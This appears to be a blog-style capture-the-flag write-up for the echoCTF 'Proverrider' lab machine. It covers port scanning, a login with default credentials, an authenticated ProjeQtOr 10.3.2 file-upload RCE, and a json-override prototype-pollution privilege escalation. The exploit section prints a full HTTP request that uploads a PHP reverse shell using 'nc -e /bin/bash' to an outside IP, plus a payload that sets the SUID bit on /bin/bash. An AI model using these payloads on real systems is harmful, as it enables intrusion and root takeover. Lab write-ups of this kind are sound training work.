---
description: >-
  Proverrider echoCTF Machine
title: Proverrider (Intermediate)                # Add title here
date: 2025-02-24 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Intermediate]                     # Change Templates to Writeup
tags: [Default Credentials, RCE, Prototype Pollution, CE Phoenix]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Proverrider.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.160.232
```

### Content

- Default Credentials
- ProjeQtOr Project Management System 10.3.2 - Remote Code Execution (RCE)
- json-override Prototype Pollution

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.232
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.232 ()   Status: Up
Host: 10.0.160.232 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
Services and Versions running:
```bash
nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.231
Nmap scan report for 10.0.160.231
Host is up, received user-set (0.17s latency).
Scanned at 2025-02-24 19:56:59 EST for 41s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 bb:8b:4a:b8:d8:62:4d:cb:59:4a:c7:7c:43:0c:7d:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRQzh/YlEJzovVge+51kZ1Mx5xft/0I/1RPWVmuZuJs
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.61 ((Debian))
|_http-title: Echo Phoenix
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.61 (Debian)
```

### Exploitation

There is a Web Service running on port 80 called `ProjeQtOr` looking for exploits on it, we identified the following [ProjeQtOr Project Management System 10.3.2 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51387), but the exploit requires authentication, I then tried to login using Default Credentials, and I got the pair `admin:admin`, with this, we can execute the script which is an OS Command Injection vulnerability, using the following POST request:
```bash
POST /tool/saveAttachment.php?csrfToken= HTTP/1.1
Host: localhost
Content-Length: 1206
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"
Accept: application/json
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY0bpJaQzcvQberWR
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/projeqtor/view/main.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=89ce98he4mk9p23ou29ul08bod
Connection: close

------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentFiles[]"; filename="miri.phar"
Content-Type: application/octet-stream

<?php echo system("nc -e /bin/bash 10.10.5.122 1234"); ?>

------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentId"


------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentRefType"

User
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentRefId"

1
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentType"

file
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10485760
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentLink"


------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentDescription"


------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentPrivacy"

1
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="uploadType"

html5
------WebKitFormBoundaryY0bpJaQzcvQberWR--
```
Then all we need to do is go to the location where it is uploaded, consider that every attached file will add 1 to the URI count `attachment_3`, if we upload another file then the URL to get the file will be `attachment_4` and so on:
```bash
http://10.0.160.232/files/attach/attachment_3/miri.phar
```

### Privilege Escalation
For the Privilege Escalation I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
www-data@proverrider:/var/www/html/files/attach/attachment_3$ sudo -l
Matching Defaults entries for www-data on proverrider:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on proverrider:
    (ALL : ALL) NOPASSWD: /usr/local/bin/overrider
```
Its content is like this:
```bash
#! /usr/bin/env node
var args = process.argv.slice(2);
(async () => {
  const lib = await import('json-override');
  const { exec } = await import('child_process');
  var defaults = JSON.parse(args[0]);
  var user = {}
try {
  lib.default ({}, defaults)
} catch (e) { }
  if(user.is_admin==true)
  {
    exec(user.cmd);
  }
})();
```

As usual, the vulnerability relays on the imported library, in this case `json-override`, there is a vulnerability reported as [Prototype Pollution in json-override](https://gist.github.com/mestrtee/97a9a7d73fc8b38fcf01322239dd5fb1), after reading the article and with the aid of DeepSeek I came with the following payload:
```bash
www-data@proverrider:/var/www/html/files/attach/attachment_3$ echo '{"__proto__": {"is_admin": true, "cmd": "chmod +s /bin/bash"}}' > payload.json
www-data@proverrider:/var/www/html/files/attach/attachment_3$ sudo /usr/local/bin/overrider "$(cat payload.json)"www-data@proverrider:/var/www/html/files/attach/attachment_3$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```
And we ARE INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

- Credentials identified for ProjeQtOr CMS are `admin:admin`

### Notes

- No fancy tricks here, all you need to search for is a good exploitation and default credentials.

### References

- [ProjeQtOr Project Management System 10.3.2 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51387)
- [Prototype Pollution in json-override](https://gist.github.com/mestrtee/97a9a7d73fc8b38fcf01322239dd5fb1)

